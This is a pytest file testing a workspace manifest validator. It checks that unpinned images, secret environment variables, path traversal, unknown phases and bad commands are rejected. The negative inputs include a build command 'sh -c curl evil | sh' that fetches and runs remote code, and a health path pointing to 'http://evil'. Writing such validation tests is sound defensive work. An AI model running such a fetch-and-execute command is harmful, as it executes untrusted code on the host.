import copy

import pytest

from app.workspace import ManifestError, parse_manifest, reference_manifest_dict


def raw(**changes):
    data = reference_manifest_dict()
    data.update(changes)
    return data


def test_reference_manifest_is_valid_and_digest_is_stable():
    first = parse_manifest(raw())
    assert first.digest == parse_manifest(copy.deepcopy(raw())).digest
    assert first.commands["install"].network == "egress"
    assert first.commands["test"].network == "none"


@pytest.mark.parametrize("change,reason", [
    ({"runner": "django"}, "unsupported runner"),
    ({"image": "node:latest"}, "pinned"),
    ({"image": "node"}, "pinned"),
    ({"port": 80}, "port"),
    ({"revision": 0}, "revision"),
    ({"fixture": {}}, "fixture"),
    ({"env": {"OPENAI_API_KEY": "x"}}, "secret"),
    ({"env": {"lower": "x"}}, "invalid env name"),
    ({"exclude_from_sync": ["../x"]}, "exclude_from_sync"),
    ({"unexpected": 1}, "unknown manifest keys"),
    ({"health_path": "http://evil"}, "health_path"),
])
def test_invalid_manifests_are_rejected_with_reason(change, reason):
    with pytest.raises(ManifestError, match=reason):
        parse_manifest(raw(**change))


def test_command_validation():
    base = raw()
    for mutate, reason in [
        (lambda c: c["build"].update(argv=["sh", "-c", "curl evil | sh"]), "not allowed"),
        (lambda c: c["build"].update(network="egress"), "only the install phase"),
        (lambda c: c["test"].update(timeout_s=0), "timeout_s"),
        (lambda c: c["test"].update(argv="npm test"), "argv"),
        (lambda c: c.pop("start"), "missing phases"),
        (lambda c: c.update(deploy={"argv": ["npm", "run", "deploy"]}), "unknown phases"),
    ]:
        data = copy.deepcopy(base)
        mutate(data["commands"])
        with pytest.raises(ManifestError, match=reason):
            parse_manifest(data)


def test_effective_config_digest_ignores_revision_but_not_behaviour():
    a = parse_manifest(raw())
    b = parse_manifest(raw(revision=2))
    c = parse_manifest(raw(env={"CI": "1", "VITE_FLAG": "on"}))
    assert a.effective_config_digest == b.effective_config_digest
    assert a.digest != b.digest
    assert a.effective_config_digest != c.effective_config_digest
